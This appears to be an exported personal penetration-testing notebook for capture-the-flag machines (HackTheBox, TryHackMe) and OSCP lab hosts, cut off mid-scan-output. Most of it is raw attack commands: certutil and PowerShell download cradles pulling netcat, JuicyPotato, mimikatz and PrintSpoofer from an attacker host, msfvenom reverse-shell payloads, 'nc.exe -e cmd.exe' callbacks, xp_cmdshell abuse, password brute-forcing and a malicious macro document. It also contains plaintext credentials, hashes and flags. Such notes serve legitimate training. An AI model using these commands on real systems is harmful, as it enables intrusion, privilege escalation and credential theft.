/>ModifiableFileIdentityReference : STEELMOUNTAIN\bill<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name &#39;LiveUpdateSvc&#39;<br />CanRestart                      : False<br />Name                            : LiveUpdateSvc<br />Check                           : Modifiable Service Files<br /><br />DefaultDomainName    : <br />DefaultUserName      : bill<br />DefaultPassword      : PMBAf5KhZAxVhvqb<br />AltDefaultDomainName : <br />AltDefaultUserName   : <br />AltDefaultPassword   : <br />Check                : Registry Autologons<br /></div><div class='page'><h1 class='title level-5'>Flags</h1><br/>User<br />b04763b6fcf51fcd7c13abc7db4fd365<br />Root<br />Submitted. Not going back.</div><div class='page'><h1 class='title level-4'>Blaster (THM)</h1><br/><br />wade<br />parzival<br /><br />C:\windows\system32\cmd.exe</div><div class='page'><h1 class='title level-4'>Artic (htb)</h1><br/><a href=""><img src="images/1497-1.png" alt="images/1497-1.png" /></a></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 hash<br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/JuicyPotato.exe&quot;</a><br /><br />.\JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a &quot;/c C:\ColdFusion8\wwwroot\CFIDE\shell.jsp&quot; -t<br /><br />.\JuicyPotato.exe -l 1337 -p C:\ColdFusion8\runtime\bin\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}<br /><br />.\JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a &quot;/c C:\ColdFusion8\runtime\bin\shell.exe&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}<br /><br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/nc.exe&quot;</a><br />.\JuicyPotato.exe -l 1337 -p C:\ColdFusion8\runtime\bin\shell53.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}<br />.\JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a &quot;/c C:\ColdFusion8\runtime\bin\nc.exe -e cmd.exe 10.10.14.7 53&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />02650d3a69a70780c302e146a6cb96f3<br />root<br />ce65ceee66b2b5ebaff07e50508ffb90</div><div class='page'><h1 class='title level-4'>Bastard (htb)</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows server 2008R2<br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/nc.exe&quot;</a><br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/JuicyPotato.exe&quot;</a><br /><br />.\JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a &quot;/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.7 443&quot; -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />ba22fde1932d06eb76a163d312f921a2<br />root<br />4bf12b963da1b30cc93496f617f7ba7c<br /><br /><a href=""><img src="images/1550-1.png" alt="images/1550-1.png" /></a></div><div class='page'><h1 class='title level-4'>Alfred (thm)</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>hydra -s 8080 10.10.251.164 http-form-post &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&quot; -l admin -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -t 10 -w 30 <br /><br />admin:admin<br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.9.4.244/mimikatz.exe&quot;</a><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.9.4.244/PsExec64.exe&quot;</a><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.9.4.244/shell.exe&quot;</a><br />msfvenom -p windows/shell_reverse_tcp LHOST=10.9.4.244 LPORT=443 -f exe &gt; shell.exe<br /><br />.\Psexec64.exe -accepteula -i -s &quot;C:\Program Files (x86)\Jenkins\cmd.exe&quot;<br /><br /><br />bruce<br />CEB6f5EcfQWYDWRY<br /><br /><br /><br />&lt;passwordHash&gt;#jbcrypt:$2a$10$mNcW44UpK2W/FfiniX6qfeIhqBnJqLQLw8MLaP/lTM1vmh.E6AGAS&lt;/passwordHash&gt;<br /><br />cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e</div><div class='page'><h1 class='title level-5'>flags</h1><br/>User<br />79007a09481963edf2e1321abd9ae2a0<br />Root<br />dff0f748678f280250f25a45b8046b4a</div><div class='page'><h1 class='title level-4'>Bastion (htb)</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>ssh l4mpje@10.10.10.134<br />bureaulampje<br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.10.14.0.7/PowerUp.ps1')">http://10.10.14.7/PowerUp.ps1&#39;)</a> <br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/winPEASany.exe&quot;</a> &amp;&amp; dir &amp;&amp; .\winPEASany.exe quiet cmd fast<br /><br />icacls &#39;C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#39;<br />icacls &#39;C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\&#39;<br /><br /><br /><br />msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f dll -a x86 --platform win  &gt; wlbsctrl.dll<br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/wlbsctrl.dll&quot;</a><br />powershell.exe -exec Bypass &quot;IEX(New-Object system.Net.WebClient).Downloadfile(&#39;http://10.10.14.7/wlbsctrl.dll&#39;,&#39;C:\Users\L4mpje\Desktop\wlbsctrl.dll&#39;)&quot;<br /><br /><br />ssh administrator@10.10.10.134<br />thXLHM96BeKL0ER2<br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />9bfe57d5c3309db3a151772f9d86c6cd<br />root<br />958850b91811676ed6620a9c430e65c8</div><div class='page'><h1 class='title level-4'>Querier (htb)</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows 10.0 Build 17763 x64<br /><br />olevba3 filename.xlsm<br />	Uid=reporting;Pwd=PcwTWTHRwryjc$c6<br /><br />python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125 -windows-auth<br />python3 <strong><span style="color:#ff9d00;">/</span></strong>usr<strong><span style="color:#ff9d00;">/</span></strong>share<strong><span style="color:#ff9d00;">/</span></strong>doc<strong><span style="color:#ff9d00;">/</span></strong>python3-impacket<strong><span style="color:#ff9d00;">/</span></strong>examples<strong><span style="color:#ff9d00;">/</span></strong>smbserver.py -smb2support tools `pwd`<br />exec xp_dirtree &#39;\\10.10.14.8\tools&#39;,1,1<br />^^Connect to pythonsmbserver on your kali and run this to dir it. This may give you an NTLM hash.<br /><br />hashcat64.exe -m 5600 .\yeet\Querier.txt .\yeet\rockyou.txt --show<br />	mssql-svc<br />	corporate568<br /><br />python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py mssql-svc:&#39;corporate568&#39;@10.10.10.125 -windows-auth<br />enable_xp_cmdshell<br />exec xp_cmdshell &quot;powershell.exe -exec bypass iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.8/Invoke-PowerShellTcp.ps1')"">http://10.10.14.8/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br /><br />whoami /groups (SEImpersonateToken)<br />powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.8:80/PrintSpoofer.exe',">http://10.10.14.8:80/PrintSpoofer.exe&#39;,</a> &#39;C:\users\mssql-svc\desktop\PrintSpoofer.exe&#39;)<br />powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.8:80/3232.exe',">http://10.10.14.8:80/nc.exe&#39;,</a> &#39;C:\users\mssql-svc\desktop\nc.exe&#39;)<br />.\printspoofer.exe -i -c C:\users\mssql-svc\desktop\nc.exe 10.10.14.8 3232 -e cmd.exe<br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>User<br />c37b41bb669da345bb14de50faab3c16<br />Root<br />b19c3794f786a1fdcf205f81497c3592</div><div class='page'><h1 class='title level-2'>OSCP Old</h1><br/>rdesktop -g 1440x900 -u administrator -p lab 192.168.167.10<br /></div><div class='page'><h1 class='title level-3'>BackBurner</h1><br/><br /></div><div class='page'><h1 class='title level-4'>10.11.1.7 Pedro</h1><br/><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Windows 10, Version 1803, courtesy of rdp product version</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.7 &amp;&amp; nmap -sC -sV -Pn 10.11.1.7 &amp;&amp; nmap -p- -Pn 10.11.1.7<br />1<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 10:32 EDT<br />Nmap scan report for 10.11.1.7<br />Host is up (0.079s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 10:32 EDT<br />Nmap scan report for 10.11.1.7<br />Host is up (0.085s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE       VERSION<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: PEDRO<br />|   NetBIOS_Domain_Name: PEDRO<br />|   NetBIOS_Computer_Name: PEDRO<br />|   DNS_Domain_Name: pedro<br />|   DNS_Computer_Name: pedro<br />|   Product_Version: 10.0.17134<br />|_  System_Time: 2020-04-26T14:31:07+00:00<br />| ssl-cert: Subject: commonName=pedro<br />| Not valid before: 2020-03-30T16:40:47<br />|_Not valid after:  2020-09-29T16:40:47<br />|_ssl-date: 2020-04-26T14:31:07+00:00; -1m46s from scanner time.<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -1m46s, deviation: 0s, median: -1m46s<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 15.98 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 10:32 EDT<br />Nmap scan report for 10.11.1.7<br />Host is up (0.072s latency).<br />Not shown: 65534 filtered ports<br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br /></div><div class='page'><h1 class='title level-6'>rdp nmap</h1><br/>squid@CoolHandKali:/Yeet/Machines/OSCP/7$ nmap -Pn --script rdp* -p 3389 10.11.1.7<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 10:56 EDT<br />Nmap scan report for 10.11.1.7<br />Host is up (0.078s latency).<br /><br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br />| rdp-enum-encryption: <br />|   Security layer<br />|     CredSSP (NLA): SUCCESS<br />|     CredSSP with Early User Auth: SUCCESS<br />|     RDSTLS: SUCCESS<br />|     SSL: SUCCESS<br />|_  RDP Protocol Version:  RDP 10.5 server<br />| rdp-ntlm-info: <br />|   Target_Name: PEDRO<br />|   NetBIOS_Domain_Name: PEDRO<br />|   NetBIOS_Computer_Name: PEDRO<br />|   DNS_Domain_Name: pedro<br />|   DNS_Computer_Name: pedro<br />|   Product_Version: 10.0.17134<br />|_  System_Time: 2020-04-26T14:54:56+00:00<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/894-1.png" alt="images/894-1.png" /></a></div><div class='page'><h1 class='title level-4'>svcorp</h1><br/>drop a .docm on .21&#39;s ftp server to give you a MSF shell (on 22)<br />cmdkey /list will dump creds for alice.<br />heresey...<br />bypassuac and getsystem, with msf. then run mimikatz to get creds<br /><br /><br /><br /><a href="https://exploit.ph/active-directory-recon-1.html">https://exploit.ph/active-directory-recon-1.html</a></div><div class='page'><h1 class='title level-5'>10.11.1.20 sv-dc01</h1><br/></div><div class='page'><h1 class='title level-6'>enumeration</h1><br/>Windows 10.0 Build 17763 x64 <br /><br />svcorp.com<br />sv-dc01.svcorp.com<br /><br />/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt</div><div class='page'><h1 class='title level-7'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.11.1.20 &amp;&amp; nmap -sC -sV -Pn 10.11.1.20 &amp;&amp; nmap -p- -Pn 10.11.1.20<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 17:33 EDT<br />Nmap scan report for 10.11.1.20<br />Host is up (0.071s latency).<br />Not shown: 988 closed ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 17:33 EDT<br />Nmap scan report for 10.11.1.20<br />Host is up (0.087s latency).<br />Not shown: 988 closed ports<br />PORT     STATE SERVICE       VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|     bind<br />|   LDAPSearchReq: <br />|_    3F28bD478d9c6eE3aB56<br />88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-27 21:31:37Z)<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: svcorp.com0., Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds?<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: svcorp.com0., Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: svcorp<br />|   NetBIOS_Domain_Name: svcorp<br />|   NetBIOS_Computer_Name: SV-DC01<br />|   DNS_Domain_Name: svcorp.com<br />|   DNS_Computer_Name: sv-dc01.svcorp.com<br />|   DNS_Tree_Name: svcorp.com<br />|   Product_Version: 10.0.17763<br />|_  System_Time: 2020-04-27T21:33:57+00:00<br />| ssl-cert: Subject: commonName=sv-dc01.svcorp.com<br />| Not valid before: 2020-01-27T17:36:14<br />|_Not valid after:  2020-07-28T17:36:14<br />|_ssl-date: 2020-04-27T21:34:12+00:00; -1m48s from scanner time.<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br />SF-Port53-TCP:V=7.80%I=7%D=4/27%Time=5EA74FAA%P=x86_64-pc-linux-gnu%r(DNSV<br />SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\<br />SF:x04bind\0\0\x10\0\x03&quot;)%r(LDAPSearchReq,2C,&quot;\0\*I\xeb\x81\x82\0\x01\0\0<br />SF:\0\0\0\0\x143F28bD478d9c6eE3aB56\x03com\0\0\x01\0\x01&quot;);<br />Service Info: Host: SV-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -1m48s, deviation: 0s, median: -1m48s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-27T21:33:59<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 285.39 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 17:38 EDT<br />Nmap scan report for 10.11.1.20<br />Host is up (0.058s latency).<br />Not shown: 65508 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />9389/tcp  open  adws<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49669/tcp open  unknown<br />49672/tcp open  unknown<br />49677/tcp open  unknown<br />49678/tcp open  unknown<br />49683/tcp open  unknown<br />49688/tcp open  unknown<br />49707/tcp open  unknown<br />56723/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 248.87 seconds</div><div class='page'><h1 class='title level-6'>pictures</h1><br/><br /><br /><a href=""><img src="images/936-1.png" alt="images/936-1.png" /></a><br /><br />nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;svcorp.com&#39;,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.11.1.20<br /><br /><a href=""><img src="images/936-2.png" alt="images/936-2.png" /></a></div><div class='page'><h1 class='title level-5'>10.11.1.21-22</h1><br/>Nmap showed that many ports were open, most interestingly 21 (ftp), 80 (http), 135, 139, 445 (smb) and 3389 (rdp).<br />Visiting the web page on port 80 read the following, ‘All documents must be supplied for edit before final submission. The  editorial team leads this process and will collect any document  supplied. To submit a document connect to the FTP server on port 21 using the  username: &quot;editor&quot; and the password &quot;MyEditWork&quot;.  Ensure that any documents are saved in the &quot;.doc&quot; or &quot;.docx&quot; format,  this will allow our editors to quickly go through the document and  perform editorial work’<br />The tester (Chris) confirmed that the FTP credentials were functional and that he was able to “put” to the server.<br />Chris used a msfvenom command to create a vbs script that he added to a macro on a word document named 443-167.docm.<br />He then uploaded the .docm file to the FTP server and recieved a reverse shell when the command was executed.<br />The shell he recieved was of alice/svcorp which allowed him to read the proof.txt file on the administrator desktop.<br /><br /><br /><br /><br /><code>#https://github.com/GhostPack/Seatbelt</code><br /><br /><a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html#-run-seatbelt-absolutely-must">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html#-run-seatbelt-absolutely-must</a></div><div class='page'><h1 class='title level-6'>enumeration</h1><br/>iis 10, either windows 10 or server 2019<br />x64<br />username: editor <br />MyEditWork<br /><br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.167 lport=443 -f vba &gt; 443-167.vba<br /><br />464a734cfa6ca2188ffaaa902f144bce<br /><br /><br />alice <br />2A2FD0C6BD593019C64769EC56536B5C<br />cmdkey /list<br />dir C:\Users\alice\AppData\Local\Microsoft\Credentials\<br />dir C:\Users\alice\AppData\Roaming\Microsoft\Credentials\<br />Get-ChildItem -Hidden C:\Users\alice\AppData\Local\Microsoft\Credentials\<br />Get-ChildItem -Hidden C:\Users\alice\AppData\Roaming\Microsoft\Credentials\<br /></div><div class='page'><h1 class='title level-7'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.21 &amp;&amp; nmap -sC -sV -Pn 10.11.1.21 &amp;&amp; nmap -p- -Pn 10.11.1.21<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-28 11:45 EDT<br />Nmap scan report for 10.11.1.21<br />Host is up (0.058s latency).<br />Not shown: 994 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />3389/tcp open  ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-28 11:45 EDT<br />Nmap scan report for 10.11.1.21<br />Host is up (0.068s latency).<br />Not shown: 994 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           FileZilla ftpd<br />| ftp-syst: <br />|_  SYST: UNIX emulated by FileZilla<br />80/tcp   open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: SV Corporation Editorial Process<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />| rdp-ntlm-info: <br />|   Target_Name: svcorp<br />|   NetBIOS_Domain_Name: svcorp<br />|   NetBIOS_Computer_Name: SV-FILE01<br />|   DNS_Domain_Name: svcorp.com<br />|   DNS_Computer_Name: sv-file01.svcorp.com<br />|   DNS_Tree_Name: svcorp.com<br />|   Product_Version: 10.0.14393<br />|_  System_Time: 2020-04-28T15:43:54+00:00<br />| ssl-cert: Subject: commonName=sv-file01.svcorp.com<br />| Not valid before: 2020-01-27T17:51:40<br />|_Not valid after:  2020-07-28T17:51:40<br />|_ssl-date: 2020-04-28T15:44:02+00:00; -1m50s from scanner time.<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -1m50s, deviation: 0s, median: -1m50s<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-28T15:43:57<br />|_  start_date: 2020-04-01T01:50:25<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 25.17 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-28 11:45 EDT<br />Nmap scan report for 10.11.1.21<br />Host is up (0.068s latency).<br />Not shown: 65519 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49668/tcp open  unknown<br />49669/tcp open  unknown<br />49670/tcp open  unknown<br />49671/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 125.63 seconds</div><div class='page'><h1 class='title level-6'>pictures</h1><br/><br /><br /><a href=""><img src="images/940-1.png" alt="images/940-1.png" /></a><br /><br /><a href=""><img src="images/940-2.png" alt="images/940-2.png" /></a><br /><br /><a href=""><img src="images/940-3.png" alt="images/940-3.png" /></a><br /><br /><a href=""><img src="images/940-4.png" alt="images/940-4.png" /></a><br /><br /><a href=""><img src="images/940-5.png" alt="images/940-5.png" /></a></div><div class='page'><h1 class='title level-4'>10.11.1.44</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Tricia<br />Burto<br /><br />https...<br /><a href="https://www.exploit-db.com/exploits/39821">https://www.exploit-db.com/exploits/39821</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.44 &amp;&amp; nmap -sC -sV -Pn 10.11.1.44 &amp;&amp; nmap -p- -Pn 10.11.1.44<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 15:51 EDT<br />Nmap scan report for 10.11.1.44<br />Host is up (0.088s latency).<br />Not shown: 998 closed ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />8000/tcp open  http-alt<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 15:51 EDT<br />Nmap scan report for 10.11.1.44<br />Host is up (0.059s latency).<br />Not shown: 998 closed ports<br />PORT     STATE SERVICE   VERSION<br />22/tcp   open  ssh       OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 65:63:69:c9:8b:96:b1:fb:be:d5:5c:f8:1e:7b:de:8f (DSA)<br />|_  2048 28:99:c0:51:20:9b:31:e1:a4:fb:9a:17:46:52:cf:fc (RSA)<br />8000/tcp open  http-alt?<br />|_http-title: Site doesn&#39;t have a title (text/plain).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-30 15:52 EDT<br />Nmap scan report for 10.11.1.44<br />Host is up (0.051s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE    SERVICE<br />22/tcp   open     ssh<br />8000/tcp filtered http-alt<br /><br />Nmap done: 1 IP address (1 host up) scanned in 63.74 seconds</div><div class='page'><h1 class='title level-6'>dirbust</h1><br/>squid@CoolHandKali:/Yeet/Machines/OSCP/44$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://10.11.1.44:8000/FUZZ | grep -v 404<br /><br />Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.<br /><br />********************************************************<br />* Wfuzz 2.4.5 - The Web Fuzzer                         *<br />********************************************************<br /><br />Target: https://10.11.1.44:8000/FUZZ<br />Total requests: 220560<br /><br />===================================================================<br />ID           Response   Lines    Word     Chars       Payload                                                                                                                              <br />===================================================================<br /><br />000000001:   200        170 L    650 W    7381 Ch     &quot;# directory-list-2.3-medium.txt&quot;                                                                                                    <br />000000002:   200        170 L    650 W    7381 Ch     &quot;#&quot;                                                                                                                                  <br />000000003:   200        170 L    650 W    7381 Ch     &quot;# Copyright 2007 James Fisher&quot;                                                                                                      <br />000000011:   200        170 L    650 W    7381 Ch     &quot;# Priority ordered case sensative list, where entries were found&quot;                                                                   <br />000000005:   200        170 L    650 W    7381 Ch     &quot;# This work is licensed under the Creative Commons&quot;                                                                                 <br />000000012:   200        170 L    650 W    7381 Ch     &quot;# on atleast 2 different hosts&quot;                                                                                                     <br />000000014:   200        170 L    650 W    7381 Ch     &quot;&quot;                                                                                                                                   <br />000000004:   200        170 L    650 W    7381 Ch     &quot;#&quot;                                                                                                                                  <br />000000013:   200        170 L    650 W    7381 Ch     &quot;#&quot;                                                                                                                                  <br />000000015:   200        170 L    650 W    7381 Ch     &quot;index&quot;                                                                                                                              <br />000000035:   400        0 L      2 W      50 Ch       &quot;cgi-bin&quot;                                                                                                                            <br />000000040:   200        170 L    650 W    7381 Ch     &quot;default&quot;                                                                                                                            <br />000000125:   303        0 L      6 W      55 Ch       &quot;user&quot;                                                                                                                               <br />000000122:   200        176 L    960 W    16703 Ch    &quot;projects&quot;                                                                                                                           <br />000000182:   303        0 L      6 W      64 Ch       &quot;data&quot;                                                                                                                               <br />000000241:   400        0 L      2 W      50 Ch       &quot;wp-content&quot;                                                                                                                         <br 